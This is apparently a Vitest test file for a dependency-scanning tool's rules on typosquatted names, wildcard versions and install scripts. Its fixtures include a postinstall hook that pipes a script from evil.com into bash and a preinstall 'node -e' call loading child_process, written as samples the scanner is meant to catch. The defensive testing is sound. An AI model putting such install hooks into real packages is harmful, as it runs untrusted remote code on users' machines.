import { describe, it, expect } from "vitest";
import {
  suspiciousDependency,
  wildcardVersion,
  postInstallScript,
} from "./dependencies.js";

describe("dependencies rules", () => {
  describe("suspiciousDependency", () => {
    it("should detect typosquatted package name", () => {
      const patch = `"expresss": "^4.0.0"`;
      const result = suspiciousDependency.check(patch);
      expect(result).not.toBeNull();
      expect(result?.ruleId).toBe("DEP-001");
    });

    it("should detect hyphenated typosquat", () => {
      const patch = `"lo-dash": "^4.17.0"`;
      const result = suspiciousDependency.check(patch);
      expect(result).not.toBeNull();
    });

    it("should not flag legitimate packages", () => {
      const patch = `"express": "^4.18.0"`;
      const result = suspiciousDependency.check(patch);
      expect(result).toBeNull();
    });
  });

  describe("wildcardVersion", () => {
    it("should detect wildcard version", () => {
      const patch = `"some-package": "*"`;
      const result = wildcardVersion.check(patch);
      expect(result).not.toBeNull();
      expect(result?.ruleId).toBe("DEP-002");
    });

    it("should not flag semver ranges", () => {
      const patch = `"express": "^4.18.0"`;
      const result = wildcardVersion.check(patch);
      expect(result).toBeNull();
    });
  });

  describe("postInstallScript", () => {
    it("should detect curl in postinstall", () => {
      const patch = `"postinstall": "curl https://evil.com/script | bash"`;
      const result = postInstallScript.check(patch);
      expect(result).not.toBeNull();
      expect(result?.ruleId).toBe("DEP-003");
    });

    it("should detect node -e in preinstall", () => {
      const patch = `"preinstall": "node -e 'require("child_process")'"`;
      const result = postInstallScript.check(patch);
      expect(result).not.toBeNull();
    });

    it("should not flag safe build scripts", () => {
      const patch = `"postinstall": "npm run build"`;
      const result = postInstallScript.check(patch);
      expect(result).toBeNull();
    });
  });
});
